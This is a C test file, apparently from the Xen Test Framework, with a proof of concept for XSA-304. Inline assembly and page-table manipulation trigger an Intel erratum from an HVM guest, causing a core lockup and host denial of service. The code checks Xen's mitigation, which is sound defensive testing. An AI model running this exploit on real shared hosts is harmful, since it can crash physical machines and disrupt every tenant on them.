/**
 * @file tests/xsa-304/main.c
 * @ref test-xsa-304
 *
 * @page test-xsa-304 XSA-304
 *
 * Advisory: [XSA-304](https://xenbits.xen.org/xsa/advisory-304.html)
 *
 * Intel's [guidance](https://www.intel.com/content/www/us/en/developer/articles/troubleshooting/software-security-guidance/advisory-guidance/machine-check-error-avoidance-page-size-change.html).
 *
 * An erratum exists on various generations of Intel processors, that can be
 * tickled by an HVM guest kernel, resulting in a core lockup and full system
 * denial of service.
 *
 * To mitigate, Xen ensures that no EPT superpages are executable, shattering
 * to 4k mappings if execution is needed.  This prevents >4k mappings from
 * entering the iTLB, and blocks a precondition of the erratum.
 *
 * @see tests/xsa-304/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-304 PoC";

typedef void (stub_t)(intpte_t *l2t, const bool *cond);
extern stub_t stub_fn;

asm (".align 4096;"
     ".skip 4096 - (stub_page_boundary - stub_fn);"

     "stub_fn:"

     /*
      * Overwrite the mapping for 16M linear (currently aliased to 0) as a 2M
      * identity page.  The underlying contents are the same because we
      * duplicated .text here to start with.
      */
     "    movq    $" STR((16 << 20) | PF_SYM(PSE, AD, RW, P)) ", 8*8(%rdi);"

     /*
      * Shoot down the 4k mapping (in the high alias) of the *next* page,
      * leaving the 4k mapping of this page intact.
      */
     "    invlpg  stub_page_boundary + (16 << 20);"

     /*
      * %rsi points at `bool cond = true` on the stack, so this jump won't
      * actually be taken, but we want speculation to follow it.
      */
     "    cmpb    $0, (%rsi);"
     "    je      1f;"

     /*
      * Write into the top of linear address space.  Because no A/D bits are
      * set in the PTEs, this suffers 5 assists, and because the PTEs were
      * flushed from the cache, it takes ages while doing so.
      */
     "    movb    $0, -1;"
     "stub_page_boundary:"

     /*
      * When speculation races ahead to here, there is no mapping because we
      * shot it out earlier.  A pagewalk occurs, and finds the 2M superpage
      * which we installed.
      *
      * As a consequence of installing the 2M mapping, the previous
      * instruction (which is busy setting A/D bits) has a linear address with
      * one valid 4k mapping pointing into the real .text location, and one
      * valid 2M mapping pointing at the aliased .text location.
      *
      * ... and the pipeline is busy asserting sanity on tracking state of the
      * uops each time they come around for another assist...
      */
     "1:  ret;"
    );

/* New pagetables */
static intpte_t nl3t[512] __page_aligned_bss;
static intpte_t nl2t[512] __page_aligned_bss;
static intpte_t nl1t[512] __page_aligned_bss;

void test_main(void)
{
    unsigned long stride = ROUNDUP(_end - _start, MB(16));
    bool cond = true;

    if ( stride != MB(16) )
        return xtf_error("Unexpected stride %lu,%#lx\n", stride, stride);

    /* Create an alias of .text at stride's distance away. */
    memcpy(_p(_start) + stride, _start, _end - _start);
    barrier();

    stub_t *stub = _p(_u(stub_fn) + stride);

    /*
     * This test is racy with a vCPU reschedule, interrupts etc.  Retry a
     * couple of times just in case.
     */
    for ( int i = 0; i < 15; ++i )
    {
        printk("Try: %u\n", i);

        /*
         * Map GFN 0 at the top of linear address space, with no A/D bits, and
         * flushing each PTE from the cache.
         */
        pae_l4_identmap[511] = pte_from_virt(nl3t, PF_SYM(RW, P));
        clflush(&pae_l4_identmap[511]);

        nl3t[511] = pte_from_virt(nl2t, PF_SYM(RW, P));
        clflush(&nl3t[511]);

        nl2t[511] = pte_from_virt(nl1t, PF_SYM(RW, P));
        clflush(&nl2t[511]);

        nl1t[511] = pte_from_gfn(0, PF_SYM(RW, P));
        clflush(&nl1t[511]);

        /* Alias 16M linear to 0, using 0's 4k mappings. */
        l2_identmap[8] = l2_identmap[0];

        flush_tlb();

        stub(l2_identmap, &cond);
    }

    xtf_success("Success: Probably not vulnerable to XSA-304\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
